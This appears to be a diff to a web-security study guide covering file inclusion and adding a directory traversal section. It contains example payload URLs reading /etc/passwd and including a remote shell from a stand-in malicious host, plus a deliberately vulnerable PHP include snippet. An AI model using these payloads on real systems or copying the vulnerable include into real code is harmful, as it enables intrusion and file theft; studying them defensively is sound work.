@@ -47,7 +47,7 @@ if not user_has_access(document):
 
 # 6. File Inclusion (Local and Remote):
 - File Inclusion vulnerabilities `allow an attacker to include files from the server (Local File Inclusion, LFI) or from remote servers (Remote File Inclusion, RFI)` into the executed script.
-- OWASP Category: `A01:2021 - Broken Access Control / A08:2021 - Software and Data Integrity Failures`
+- OWASP Category: `"A05:2021 Security Misconfiguration" or "A01:2021 Broken Access Control"`
 - Local File Inclusion (LFI): This allows an attacker to include files from the local server. Eg. `http://example.com/index.php?page=../../../../etc/passwd`
 - Remote File Inclusion (RFI): This allows an attacker to include files from a remote server. Eg. `http://example.com/index.php?page=http://malicious.com/shell`
 
@@ -77,6 +77,26 @@ if (in_array($page, $allowed_pages)) {
 
 ### Detection/Testing Methods:
 - Static Code Analysis, Dynamic Analysis, Manual Testing.
+
+# 7. Directory Traversal
+Definition: Directory traversal (also known as path traversal) vulnerabilities allow an attacker to access directories and files that are stored outside the web root folder.
+
+### How it Works:
+- Description: The attacker manipulates file paths, using special characters like `../ to navigate to parent directories.`
+- Example: `Accessing the /etc/passwd` file by traversing up the directory tree.
+- Purpose: To read arbitrary files from the server, potentially exposing sensitive information.
+
+```
+Vuln Code:
+
+<?php
+$file = $_GET['file'];
+include("/var/www/html/" . $file);
+?>
+```
+
+---
+---
 
 ## Common Detection Techniques
 1. `Penetration Testing`:
